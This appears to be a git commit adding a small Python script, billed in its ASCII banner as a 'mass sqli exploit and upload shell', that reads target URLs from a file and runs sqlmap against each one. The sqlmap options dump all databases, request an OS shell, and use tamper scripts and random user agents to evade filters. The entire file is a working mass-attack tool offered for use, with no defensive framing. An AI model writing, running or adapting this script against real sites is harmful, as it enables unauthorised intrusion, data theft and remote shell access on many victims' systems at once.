9b8a1cbeb9821b1ad8c961420fe5caf1a75cd525
Abcdiregter <111136892+Abcdiregter@users.noreply.github.com>
2023-08-01 18:50:51 +0700

    Add files via upload

---
+++ mass.py
@@ -0,0 +1,27 @@
+import os 
+
+list = open("target.txt")
+banner = ("""
+
+                                                ▄▄   ▄▄  
+                                              ▀███   ██  
+                                                ██       
+▀████████▄   ▄██▀██▄▀██▀   ▀██▀▄██▀███▄██▀███   ██ ▀███  
+  ██    ██  ██▀   ▀██ ▀██ ▄█▀  ██   ▀▀█▀   ██   ██   ██  
+  ██    ██  ██     ██   ███    ▀█████▄█    ██   ██   ██  
+  ██    ██  ██▄   ▄██ ▄█▀ ██▄  █▄   ███▄   ██   ██   ██  
+▄████  ████▄ ▀█████▀▄██▄   ▄██▄██████▀▀██████ ▄████▄████▄
+                                           ██            
+                                        ▄████▄           
+
+                                        mass sqli exploit and upload shell  by vilgax
+          
+
+          make sure u have already installed sqlmap 
+          
+""")
+
+for each in list:
+    combo="  --all --os-shell --threads=10 --random-agent --time-sec=2 --hex --tamper=chardoubleencode,randomcase --technique=BEUS --code=200 --output-dir=result"
+    os.system(f"sqlmap --url {each} {combo}")
+
